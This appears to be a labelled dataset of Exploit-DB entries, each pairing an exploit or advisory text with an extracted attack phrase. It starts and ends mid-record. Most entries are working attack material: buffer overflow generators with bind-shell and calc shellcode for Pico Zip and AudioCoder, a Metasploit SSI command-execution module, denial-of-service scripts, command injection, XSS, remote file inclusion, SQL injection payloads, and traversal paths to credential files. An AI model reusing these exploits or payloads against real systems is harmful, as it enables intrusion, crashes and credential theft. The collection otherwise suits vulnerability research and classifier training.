"""";{touch,/tmp/TESTFILE};echo ""  URL => /nagiosna/index.php/download/report/source/<ID>/<BASE64 ENCODED PAYLOAD> Method => GET POC Payload => q[rid]=5&q[gid]=1"" """";{touch,/tmp/TESTFILE};echo ""  Arbitrary code execution in the context of the ‘nna’ user can also be obtained by abusing the intended functionality to define custom alert commands. As shown in the next section, this exposes the application to additional privilege escalation attack vectors.   ==Privilege Escalation== The default application sudoers configuration allows the ‘apache’ and ‘nna’ users to run multiple Bash and Python scripts as root without being prompted for a password. The 'apache' user is in the 'nnacmd' group, which has insecure write permissions to multiple script files. An attacker can overwrite their contents with a malicious payload (i.e. spawn a shell) and escalate privileges to root.  The script files with insecure permissions are listed below:  PATH => /usr/local/nagiosna/bin/rc.py PERMISSIONS => rwxrwxr-t nna nnacmd  PATH => /usr/local/nagiosna/scripts/change_timezone.sh PERMISSIONS => rwsrwsr-t nna nnacmd  PATH => /usr/local/nagiosna/scripts/upgrade_to_latest.sh PERMISSIONS => rwsrwsr-t nna nnacmd   +----------+ | Solution | +----------+ Upgrade to Nagios Network Analyzer 2.2.2.   +------------+ |  Timeline  | +------------+ 2/06/2016 – Initial disclosure to vendor 3/06/2016 – Vendor acknowledges receipt of advisory 3/06/2016 – Vendor releases new software build (2.2.1) 8/07/2016 – Inform vendor about insecure fix (generation of encryption key based on epoch) 9/07/2016 – Vendor confirms issue and replies with new fix 01/08/2016 – Vendor releases patched software version 11/08/2016 – Public disclosure   +------------+ | Additional | +------------+ Further information is available in the accompanying PDF. http://www.security-assessment.com/files/documents/advisory/NagiosNetworkAnalyzerAdvisory.pdf",overwrite their contents with a malicious payload,1
21122,"Linux Kernel 2.2/2.4 - Deep Symbolic Link Denial of Service source: https://www.securityfocus.com/bid/3444/info  A denial-of-service vulnerability exists in several versions of the Linux kernel.  The problem occurs when a user with local access creates a long chain of symbolically linked files. When the kernel dereferences the symbolic links, the process scheduler is blocked, effecively locking the system until the dereferencing is complete.   #!/bin/sh # by Nergal mklink() { IND=$1 NXT=$(($IND+1)) EL=l$NXT/../ P="""" I=0 while [ $I -lt $ELNUM ] ; do         P=$P""$EL""         I=$(($I+1)) done ln -s ""$P""l$2 l$IND }  #main program  if [ $# != 1 ] ; then 	echo A numerical argument is required. 	exit 0 fi   ELNUM=$1  mklink 4 mklink 3 mklink 2 mklink 1 mklink 0 /../../../../../../../etc/services mkdir l5 mkdir l",creates a long chain of symbolically linked files,1
3230,"Apple iChat Bonjour 3.1.6.441 - Multiple Denial of Service Vulnerabilities #!/usr/bin/ruby # (c) 2006 Lance M. Havok <lmh [at] info-pull.com> # All Rights Reserved. # basic proof of concept for MOAB-29-01-2007 #  require 'digest/sha1' require 'rubygems' require 'net/dns/mdns-sd'  bugselected = (ARGV[0] || ""0"").to_i TMP_ARR     = [] DNSSD       = Net::DNS::MDNSSD  trap(""INT"") {   puts ""++ Exiting...""   begin     TMP_ARR.each do |o|       o.stop     end   rescue   end    exit }  # # This method abuses a design weakness in iChat Bonjour services, allowing an user # to conduct a denial of service attack against reachable clients by registering multiple # (fake) _presence records. # def oh_gnoes_contact_dos(status_msg = ""ekoC stronS reztleS yrraL"".reverse,                          firstname  = 'Pwnies',                          lastname   = 'Mgheetacek')      available_status  = [ ""avail"", ""away"" ]   cur_status        = available_status[rand(available_status.size)]    # the TXT keys (see http://www.xmpp.org/extensions/xep-0174.html)   keyset = {  ""status""    => cur_status,                                # - presence availability of the user               ""msg""       => status_msg,                                # - user's state               ""vc""        => ""CUAV!"",                                   # - user's ability for A/V conferencing               ""1st""       => firstname,                                 # - first name of the user               ""last""      => lastname,                                  # - last name of the user               ""txtvers""   => ""1"",                                       # - version of the TXT fields supported               ""phsh""      => Digest::SHA1.hexdigest(rand(0xffffffff).to_s),  # - fake SHA-1 hash of icon               ""port.p2pj"" => ""1337""                                     # - Port for link-local communications                                                                         # (ignored).             }    count = 0   while true     rand_str = ""3891ecniSrevoLyaGeipmaerCterceSkecatPreztleSyrraL"".reverse     (rand_str.length-1).downto(1) do |c|        n = rand(c) + 1        rand_str[c], rand_str[n] = rand_str[n], rand_str[c]     end          puts ""++ Registering presence #{count}""     # TODO: add NULL record with user avatar icon (ex. Larry Seltzer's taliban bearded face)     dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)     #sleep 40     TMP_ARR << dos_handle     count += 1   end end  # # This method causes iChat Agent to raise an exception (SIGTRAP signal) with a crafted TXT key hash. # Program received signal SIGTRAP, Trace/breakpoint trap. # 0x9262050b in _NSRaiseError () # def format_dos()   keyset = {  ""status"" => ""avail"", ""msg"" => ""I'm the Doomed eWook"", ""vc"" => ""CUAV!"", ""1st"" => ""Larry"",               ""last"" => ""Seltzer"", ""txtvers"" => ""1"", ""phsh"" => (""\250"" * 40),               ""port.p2pj"" => ""1337"" }      rand_str = ""nabilaTAsAlufrewoPsIyrraL"".reverse   (rand_str.length-1).downto(1) do |c|      n = rand(c) + 1      rand_str[c], rand_str[n] = rand_str[n], rand_str[c]   end      dos_handle = DNSSD.register(rand_str, '_presence._tcp', 'local', rand(65535), keyset)   dos_handle.stop end  # # Proof of concept method selection below. #  puts ""++ MOAB-29-01-2007: iChat Bonjour Fun"" puts ""++ Selected target: #{bugselected}"" case bugselected   when 0     format_dos()   when 1     if (ARGV[1] and ARGV[2] and ARGV[3])       oh_gnoes_contact_dos(ARGV[1], ARGV[2], ARGV[3])     else       oh_gnoes_contact_dos()     end end  # milw0rm.com [2007-01-30]","registering multiple ""1st""",1
16914,"The Matt Wright Guestbook.pl - Arbitrary Command Execution (Metasploit) ## # $Id: guestbook_ssi_exec.rb 9671 2010-07-03 06:21:31Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Matt Wright guestbook.pl Arbitrary Command Execution', 			'Description'    => %q{ 				The Matt Wright guestbook.pl <= v2.3.1 CGI script contains 				a flaw that may allow arbitrary command execution. The vulnerability 				requires that HTML posting is enabled in the guestbook.pl script, and 				that the web server must have the Server-Side Include (SSI) script 				handler enabled for the '.html' file type. By combining the script 				weakness with non-default server configuration, it is possible to exploit 				this vulnerability successfully. 			}, 			'Author'         => [ 'patrick' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9671 $', 			'References'     => 				[ 					[ 'CVE', '1999-1053' ], 					[ 'OSVDB', '84' ], 					[ 'BID', '776' ], 				], 			'Privileged'     => false, 			'Payload'        => 				{ 					'DisableNops' => true, 					'Space'       => 1024, 					'Compat'      => 						{ 							'PayloadType' => 'cmd', 							'RequiredCmd' => 'generic perl ruby bash telnet', 						} 				}, 			'Platform'       => [ 'unix', 'win', 'linux' ], 			'Arch'           => ARCH_CMD, 			'Targets'        => [[ 'Automatic', { }]], 			'DisclosureDate' => 'Nov 05 1999', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('URI', [true, ""guestbook.pl script path"", ""/cgi-bin/guestbook.pl""]), 					OptString.new('URIOUT', [true, ""guestbook.html output"", ""/guestbook/guestbook.html""]), 				], self.class) 	end  	def exploit 		realname	= rand_text_alphanumeric(20) 		email		= rand_text_alphanumeric(20) 		city		= rand_text_alphanumeric(20) 		state		= rand_text_alphanumeric(20) 		country 	= rand_text_alphanumeric(20)  		sploit = Rex::Text.uri_encode(""<!--#exec cmd=\"""" + payload.encoded.gsub('""','\""') + ""\"""", 'hex-normal')  		req1 = send_request_cgi({ 			'uri'     => datastore['URI'], 			'method'  => 'POST', 			'data'    => ""realname=#{realname}&username=#{email}&city=#{city}&state=#{state}&country=#{country}&comments=#{sploit}"", 		}, 25)  		req2 = send_request_raw({ 			'uri'     => datastore['URIOUT'], 		}, 25)  	end end",a specially crafted .pl file,1
30440,WebEvent 4.03 - 'Webevent.cgi' Cross-Site Scripting source: https://www.securityfocus.com/bid/25148/info  WebEvent is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/cgi-bin/webevent/webevent.cgi?cmd=%22%3CSCRIPT+SRC=http://www.example2.com/xss.js%3E%3C/SCRIPT%3E,malicious PHP code,1
1917,"Pico Zip 4.01 - 'Filename' Local Buffer Overflow #!/usr/bin/perl # Pico Zip v. 4.01 Long Filename Buffer Overflow # Original advisory - http://www.securityfocus.com/archive/1/437103/30/30/threaded # Author - c0rrupt # Greets - sh0uts to n0limit, muts, and brax for the music ;) # # The vulnerability is caused due to a boundary error within the # ""zipinfo.dll"" info tip shell extension when reading a ACE, RAR, or # ZIP archive that contains a file with an overly long filename. This # can be exploited to cause a stack-based buffer overflow when the user # moves the mouse cursor over a malicious archive either in Windows # Explorer or from any program that uses the file-open dialog box. # # Running this script will generate a malformed zip file that will execute # the given shellcode when a user moves his cursor over the file. # (This exploit bypasses stack protection and DEP)  $offset = ""\x6F\xE2\xD7\x5A""; #Windows XP SP2 English  # win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com $shellcode =  ""\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa3"". ""\x52\xaa\x9a\x83\xeb\xfc\xe2\xf4\x5f\x38\x41\xd7\x4b\xab\x55\x65"". ""\x5c\x32\x21\xf6\x87\x76\x21\xdf\x9f\xd9\xd6\x9f\xdb\x53\x45\x11"". ""\xec\x4a\x21\xc5\x83\x53\x41\xd3\x28\x66\x21\x9b\x4d\x63\x6a\x03"". ""\x0f\xd6\x6a\xee\xa4\x93\x60\x97\xa2\x90\x41\x6e\x98\x06\x8e\xb2"". ""\xd6\xb7\x21\xc5\x87\x53\x41\xfc\x28\x5e\xe1\x11\xfc\x4e\xab\x71"". ""\xa0\x7e\x21\x13\xcf\x76\xb6\xfb\x60\x63\x71\xfe\x28\x11\x9a\x11"". ""\xe3\x5e\x21\xea\xbf\xff\x21\xda\xab\x0c\xc2\x14\xed\x5c\x46\xca"". ""\x5c\x84\xcc\xc9\xc5\x3a\x99\xa8\xcb\x25\xd9\xa8\xfc\x06\x55\x4a"". ""\xcb\x99\x47\x66\x98\x02\x55\x4c\xfc\xdb\x4f\xfc\x22\xbf\xa2\x98"". ""\xf6\x38\xa8\x65\x73\x3a\x73\x93\x56\xff\xfd\x65\x75\x01\xf9\xc9"". ""\xf0\x01\xe9\xc9\xe0\x01\x55\x4a\xc5\x3a\xbb\xc6\xc5\x01\x23\x7b"". ""\x36\x3a\x0e\x80\xd3\x95\xfd\x65\x75\x38\xba\xcb\xf6\xad\x7a\xf2"". ""\x07\xff\x84\x73\xf4\xad\x7c\xc9\xf6\xad\x7a\xf2\x46\x1b\x2c\xd3"". ""\xf4\xad\x7c\xca\xf7\x06\xff\x65\x73\xc1\xc2\x7d\xda\x94\xd3\xcd"". ""\x5c\x84\xff\x65\x73\x34\xc0\xfe\xc5\x3a\xc9\xf7\x2a\xb7\xc0\xca"". ""\xfa\x7b\x66\x13\x44\x38\xee\x13\x41\x63\x6a\x69\x09\xac\xe8\xb7"". ""\x5d\x10\x86\x09\x2e\x28\x92\x31\x08\xf9\xc2\xe8\x5d\xe1\xbc\x65"". ""\xd6\x16\x55\x4c\xf8\x05\xf8\xcb\xf2\x03\xc0\x9b\xf2\x03\xff\xcb"". ""\x5c\x82\xc2\x37\x7a\x57\x64\xc9\x5c\x84\xc0\x65\x5c\x65\x55\x4a"". ""\x28\x05\x56\x19\x67\x36\x55\x4c\xf1\xad\x7a\xf2\x53\xd8\xae\xc5"". ""\xf0\xad\x7c\x65\x73\x52\xaa\x9a"";    $filename = $shellcode . ""A""x(524-length($shellcode)) . $offset;   $head   = ""\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00"". 	  ""\xB7\xAC\xCE\x34\x00\x00\x00\x00\x00\x00"". 	  ""\x00\x00\x00\x00\x00\x00\x14\x02\x00\x00"";  $middle = ""\x2e\x74\x78\x74\x50\x4B\x01\x02\x14\x00"".           ""\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34"".           ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"". 	  ""\x00\x00\x14\x02\x00\x00\x00\x00\x00\x00"".           ""\x01\x00\x24\x00\x00\x00\x00\x00\x00\x00"";  $tail   = ""\x2e\x74\x78\x74\x50\x4B\x05\x06\x00\x00"".  	  ""\x00\x00\x01\x00\x01\x00\x42\x02\x00\x00"".           ""\x32\x02\x00\x00\x00\x00"";  $evilzip = $head . $filename . $middle . $filename . $tail;  open(ZIPFILE,"">exploit.zip"")|| die ""cannot open output file""; print(ZIPFILE $evilzip) || die ""cannot write to output file""; close(ZIPFILE);  # milw0rm.com [2006-06-15]",a malformed zip file that will execute the given shellcode when a user moves his cursor over the file,1
20442,"Greg Matthews - 'Classifieds.cgi' 1.0 Hidden Variable source: https://www.securityfocus.com/bid/2019/info  Classifieds.cgi is a perl script (part of the classifieds package by Greg Matthews) which provides simple classified ads to web sites. Due to improper input validation it can be used to execute any command on the host machine, with the privileges of the web server. If the attacker can submit a command to run as a hidden variable that command will be executed. Normally this variable is reserved for the mail program and is accessed from an HTML page with the following piece of code: <input type=""hidden"" name=""mailprog"" value=""/usr/sbin/sendmail"">   <form method=post action=""/cgi-bin/classifieds.cgi""> <input type=""hidden"" name=""ClassifiedsDir"" value=""/home/httpd/html/class/ads/""> <input type=""hidden"" name=""ViewDir"" value=""http://victim.com/class/ads/""> <input type=""hidden"" name=""ErrorReturn"" value=""http://victim.com/class/index.html""> <input type=""hidden"" name=""ReturnURL"" value=""http://victim.com/class/hi.html""> <input type=""hidden"" name=""return"" value=""duke@viper.net.au""> <input type=""hidden"" name=""mailprog"" value=""touch /tmp/bighole""> <b>Which department do you want your ad to be placed in or you would like to view? </form>",a specially crafted URL,1
24211,"Microsoft Internet Explorer 6 - HREF Save As Denial of Service source: https://www.securityfocus.com/bid/10552/info  A vulnerability is reported to exist in Internet Explorer that may allow an attacker to cause the application to crash. The issue presents itself when a user attempts to invoke the ""Save As"" option on a malicious HREF URI.  When this URI is processed the issue leads to a crash in the running instance of Internet Explorer and all windows spawned from this instance.  <center><a href=::%7b>Right Click aOn Me And Click ""Save Target As""</a>","invoke the ""Save As"" option on a malicious HREF URI",1
26891,"Light Audio Mixer 1.0.12 - '.wav' Crash (PoC) # Exploit Title: Light Audio Mixer Version 1.0.12 (.wav) - Crash POC # Date: 14-07-2013 # Exploit Author: ariarat # Software Link: http://download.cnet.com/Light-Audio-Mixer/3000-2139_4-10791607.html # Version: 1.0.12 # Tested on: [ Windows XP sp3] #============================================================================================ # After creating PoC file.(.wav),drag it to Play List and choose a Deck(if present) and press OK! #============================================================================================ # Contact : #------------------ # Web Page : http://ariarat.blogspot.com # Email    : mehdi.esmaeelpour@gmail.com #============================================================================================  #!/usr/bin/python  string=(""\x2E\x73\x6E\x64\x00\x00\x01\x18\x00\x00\x42\xDC\x00\x00\x00\x01"" ""\x00\x00\x1F\x40\x00\x00\x00\x00\x69\x61\x70\x65\x74\x75\x73\x2E"" ""\x61\x75\x00\x20\x22\x69\x61\x70\x65\x74\x75\x73\x2E\x61\x75\x22"" ""\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"" ""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"")  filename = ""PoC.wav"" file = open(filename , ""w"") file.write(string) file.close()",a specially crafted .wav file,1
41030,"SapLPD 7.40 - Denial of Service # Exploit Title: SAPlpd 7.40 Denial of Service # Date: 2016-12-28 # Exploit Author: Peter Baris # Exploit code: http://saptech-erp.com.au/resources/saplpd_dos.zip # Version: 7.40 all patch levels (as a part of SAPGui 7.40)   # Tested on: Windows Server 2008 R2 x64, Windows 7 Pro x64   import socket  # Opcodes 03h and 04h are vulnerable to bad characters 00h and 0ah # So you can modify the DoS accordingly # The added 800 A's are just to show, that you can deliver a complete shell with the command  DoS = (""\x03""+""\x0a""+""\x41""*800)   s = socket.socket() s.settimeout(1) s.connect(('192.168.198.132', 515)) print(""[*] Crashing SAPlpd 7.40"") print(""[*] Payload length: ""+str(len(DoS))+"" bytes"") s.send(DoS) s.close()","modify the DoS accordingly The added 800 A's are just to show, that you can deliver a complete shell with the command",1
42385,"AudioCoder 0.8.46 - Local Buffer Overflow (SEH) #!/usr/bin/python # Exploit Title      : AudioCoder 0.8.46 Local Buffer Overflow (SEH) # CVE				 : CVE-2017-8870 # Exploit Author     : Muhann4d @0xSecured # Vendor Homepage    : http://www.mediacoderhq.com # Vulnerable Software: http://www.mediacoderhq.com/getfile.htm?site=mediatronic.com.au/download&file=AudioCoder-0.8.46.exe # Vulnerable Version : 0.8.46 # Fixed version      : N/A # Category           : Local Buffer Overflow # Tested on OS       : Windows 7 Pro SP1 32bit # How to             : Open AudioCoder then drag & drop the .m3u file in it and then press the START button. # Timeline 	:  # 2017-05-05: Vulnerability discovered, vendor has been contaced # 2017-05-08: Vendor replied denying it ..""I believe this was an old issue and no longer exists in the latest version""  # 2017-05-09: A POC sent to the vendor. No reply since then. # 2017-06-26: Exploit released.   print ""AudioCoder 0.8.46 Local Buffer Overflow By Muhann4d @0xSecured"" from struct import pack  junk = ""http://"" + ""\x41"" * 741 nseh = pack('<I',0x909006eb) seh = pack('<I',0x66015926) nops= ""\x90"" * 20 shell=(""\xb8\x9d\x01\x15\xd1\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"" ""\x32\x31\x42\x12\x03\x42\x12\x83\x77\xfd\xf7\x24\x7b\x16\x7e"" ""\xc6\x83\xe7\xe1\x4e\x66\xd6\x33\x34\xe3\x4b\x84\x3e\xa1\x67"" ""\x6f\x12\x51\xf3\x1d\xbb\x56\xb4\xa8\x9d\x59\x45\x1d\x22\x35"" ""\x85\x3f\xde\x47\xda\x9f\xdf\x88\x2f\xe1\x18\xf4\xc0\xb3\xf1"" ""\x73\x72\x24\x75\xc1\x4f\x45\x59\x4e\xef\x3d\xdc\x90\x84\xf7"" ""\xdf\xc0\x35\x83\xa8\xf8\x3e\xcb\x08\xf9\x93\x0f\x74\xb0\x98"" ""\xe4\x0e\x43\x49\x35\xee\x72\xb5\x9a\xd1\xbb\x38\xe2\x16\x7b"" ""\xa3\x91\x6c\x78\x5e\xa2\xb6\x03\x84\x27\x2b\xa3\x4f\x9f\x8f"" ""\x52\x83\x46\x5b\x58\x68\x0c\x03\x7c\x6f\xc1\x3f\x78\xe4\xe4"" ""\xef\x09\xbe\xc2\x2b\x52\x64\x6a\x6d\x3e\xcb\x93\x6d\xe6\xb4"" ""\x31\xe5\x04\xa0\x40\xa4\x42\x37\xc0\xd2\x2b\x37\xda\xdc\x1b"" ""\x50\xeb\x57\xf4\x27\xf4\xbd\xb1\xd8\xbe\x9c\x93\x70\x67\x75"" ""\xa6\x1c\x98\xa3\xe4\x18\x1b\x46\x94\xde\x03\x23\x91\x9b\x83"" ""\xdf\xeb\xb4\x61\xe0\x58\xb4\xa3\x83\x3f\x26\x2f\x44"") #calc.exe  junkD = ""D"" * (2572 - (len(junk + nseh + seh + nops + shell))) exploit = junk + nseh + seh + nops + shell + junkD    try:     file= open(""Exploit.m3u"",'w')     file.write(exploit)     file.close()     raw_input(""\nExploit has been created!\n"") except:     print ""There has been an Error""",a specially crafted .m3u file,1
47688,"Apache Httpd mod_proxy - Error Page Cross-Site Scripting The trick is to use a vertical tab (`%09`) and then place another URL in the tag. So once a victim clicks the link on the error page, she will go somewhere else.  As you can see, the browser changes the destination from relative / to an absolute url https://enoflag.de. The exploit is `http://domain.tld/%09//otherdomain.tld`  Here's the httpd configuration to reproduce the behavior:  ```     <Location />         ProxyPass http://127.0.0.1:9000/ connectiontimeout=1 timeout=2         ProxyPassReverse http://127.0.0.1:9000/          Order allow,deny         Allow from all     </Location> ```",place another URL in the tag,1
28016,DoubleSpeak 0.1 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/18401/info  DoubleSpeak is prone to multiple remote file-include vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and the underlying system; other attacks are also possible.  These issues affect versions 0.1 and prior; other versions may also be vulnerable.  This BID has been retired.  http://www.example.com/[igloo_Path]/html/index.php?config[private]=http://www.example.com/x.txt?&cmd=uname -a http://www.example.com/[igloo_Path]/html/faq.php?config[private]=http://www.example.com/x.txt?&cmd=uname -a http://www.example.com/[igloo_Path]/html/hardware.php?config[private]=http://www.example.com/x.txt?&cmd=uname -a,include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process,1
39529,"Wireshark - wtap_optionblock_free Use-After-Free Source: https://code.google.com/p/google-security-research/issues/detail?id=739  The following crash due to a use-after-free condition can be observed in an ASAN build of Wireshark (current git master), by feeding a malformed file to tshark (""$ ./tshark -nVxr /path/to/file""):  --- cut --- ==6853==ERROR: AddressSanitizer: heap-use-after-free on address 0x60400009d960 at pc 0x7ff7905dc0fe bp 0x7fff079e9fc0 sp 0x7fff079e9fb8 READ of size 4 at 0x60400009d960 thread T0     #0 0x7ff7905dc0fd in wtap_optionblock_free wireshark/wiretap/wtap_opttypes.c:161:20     #1 0x7ff7905d7b58 in wtap_close wireshark/wiretap/wtap.c:1211:4     #2 0x52a08b in load_cap_file wireshark/tshark.c:3685:3     #3 0x51e4bc in main wireshark/tshark.c:2213:13  0x60400009d960 is located 16 bytes inside of 40-byte region [0x60400009d950,0x60400009d978) freed by thread T0 here:     #0 0x4c1d80 in __interceptor_free llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:30     #1 0x7ff7905dc32f in wtap_optionblock_free wireshark/wiretap/wtap_opttypes.c:173:9     #2 0x7ff7905d7b58 in wtap_close wireshark/wiretap/wtap.c:1211:4     #3 0x52a08b in load_cap_file wireshark/tshark.c:3685:3     #4 0x51e4bc in main wireshark/tshark.c:2213:13  previously allocated by thread T0 here:     #0 0x4c2098 in malloc llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:40     #1 0x7ff77bc84610 in g_malloc (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4e610)     #2 0x7ff79055907d in pcapng_read wireshark/wiretap/pcapng.c:2564:35     #3 0x7ff7905d825b in wtap_read wireshark/wiretap/wtap.c:1253:7     #4 0x528036 in load_cap_file wireshark/tshark.c:3499:12     #5 0x51e4bc in main wireshark/tshark.c:2213:13  SUMMARY: AddressSanitizer: heap-use-after-free wireshark/wiretap/wtap_opttypes.c:161:20 in wtap_optionblock_free Shadow bytes around the buggy address:   0x0c088000bad0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c088000bae0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c088000baf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c088000bb00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c088000bb10: fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 fa =>0x0c088000bb20: fa fa 00 00 00 00 00 fa fa fa fd fd[fd]fd fd fa   0x0c088000bb30: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa   0x0c088000bb40: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa   0x0c088000bb50: fa fa 00 00 00 00 00 fa fa fa 00 00 00 00 00 fa   0x0c088000bb60: fa fa fd fd fd fd fd fd fa fa 00 00 00 00 00 fa   0x0c088000bb70: fa fa fd fd fd fd fd fa fa fa 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==6853==ABORTING --- cut ---  The crash was reported at https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=12173. Attached are three files which trigger the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39529.zip",feeding a malformed file to tshark,1
17304,"Cisco Unified Operations Manager - Multiple Vulnerabilities Sense of Security - Security Advisory - SOS-11-006  Release Date.                  18-May-2011 Last Update.                   - Vendor Notification Date.      28-Feb-2011 Product.                       Cisco Unified Operations Manager                                Common Services Framework Help Servlet                                Common Services Device Center                                CiscoWorks Homepage                                Note: All of the above products are                                included by default in CuOM. Platform.                      Microsoft Windows Affected versions.             CuOM 8.0 and 8.5 (verified),                                possibly others. Severity Rating.               Medium - Low Impact.                        Database access, cookie and credential                                theft, impersonation, loss of                                confidentiality, local file disclosure,                                information disclosure. Attack Vector.                 Remote with authentication Solution Status.               Vendor patch (upgrade to CuOM 8.6 as                                advised by Cisco) CVE reference.                 CVE-2011-0959 (CSCtn61716)                                CVE-2011-0960 (CSCtn61716)                                CVE-2011-0961 (CSCto12704)                                CVE-2011-0962 (CSCto12712)                                CVE-2011-0966 (CSCto35577)  Details. Cisco Unified Operations Manager (CuOM) is a NMS for voice developed by Cisco Systems. Operations Manager monitors and evaluates the current status of both the IP communications infrastructure and the underlying transport infrastructure in your network.  Multiple vulnerabilities have been identified in Cisco Unified Operations Manager and associated products. These vulnerabilities include multiple blind SQL injections, multiple XSS. and a directory traversal vulnerability.  1. Blind SQL injection vulnerabilities that affect CuOM CVE-2011-0960 (CSCtn61716): The Variable CCMs of PRTestCreation can trigger a blind SQL injection vulnerability by supplying a single quote, followed by a time delay call: /iptm/PRTestCreation.do?RequestSource=dashboard&MACs=&CCMs='waitfor%20 delay'0:0:20'--&Extns=&IPs=  Additionally, variable ccm of TelePresenceReportAction can trigger a blind SQL injection vulnerability by supplying a single quote: /iptm/TelePresenceReportAction.do?ccm='waitfor%20delay'0:0:20'--  2. Reflected XSS vulnerabilities that affect CuOM CVE-2011-0959 (CSCtn61716): /iptm/advancedfind.do?extn=73fcb</script><script>alert(1)</script>23fb e43447 /iptm/ddv.do?deviceInstanceName=f3806""%3balert(1)//9b92b050cf5&deviceC apability=deviceCap /iptm/ddv.do?deviceInstanceName=25099<script>alert(1)</script>f813ea8c 06d&deviceCapability=deviceCap /iptm/eventmon?cmd=filterHelperca99b<script>alert(1)</script>542256870 d5&viewname=device.filter&operation=getFilter&dojo.preventCache=129851 8961028 /iptm/eventmon?cmd=getDeviceData&group=/3309d<script>alert(1)</script> 09520eb762c&dojo.preventCache=1298518963370 /iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp?clusterName=d4f84""%3b alert(1)//608ddbf972 /iptm/faultmon/ui/dojo/Main/eventmon_wrapper.jsp?deviceName=c25e8""%3ba lert(1)//79877affe89 /iptm/logicalTopo.do?clusterName=&ccmName=ed1b1""%3balert(1)//cda6137ae 4c /iptm/logicalTopo.do?clusterName=db4c1""%3balert(1)//4031caf63d7  Reflected XSS vulnerability that affect Common Services Device Center CVE-2011-0962 (CSCto12712): /CSCOnm/servlet/com.cisco.nm.help.ServerHelpEngine?tag=Portal_introduc tionhomepage61a8b""%3balert(1)//4e9adfb2987  Reflected XSS vulnerability that affects Common Services Framework Help Servlet CVE-2011-0961 (CSCto12704): /cwhp/device.center.do?device=&72a9f""><script>alert(1)</script>5f5251a aad=1  3. Directory traversal vulnerability that affects CiscoWorks Homepage CVE-2011-0966 (CSCto35577): http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\boot.ini cmfDBA user database info: http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program  Files\CSCOpx\MDC\Tomcat\webapps\triveni\WEB-INF\classes\schedule.prope rties DB connection info for all databases: http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program  Files\CSCOpx\lib\classpath\com\cisco\nm\cmf\dbservice2\DBServer.proper ties Note: When reading large files such as this file, ensure the row limit is adjusted to 500 for example. DB password change log: http://target:1741/cwhp/auditLog.do?file=..\..\..\..\..\..\..\Program  Files\CSCOpx\log\dbpwdChange.log Solution. Upgrade to CuOM 8.6.  Refer to Cisco Bug IDs: CSCtn61716, CSCto12704, CSCto12712 and CSCto35577 for information on patches and availability of fixes.  Discovered by. Sense of Security Labs.  About us. Sense of Security is a leading provider of 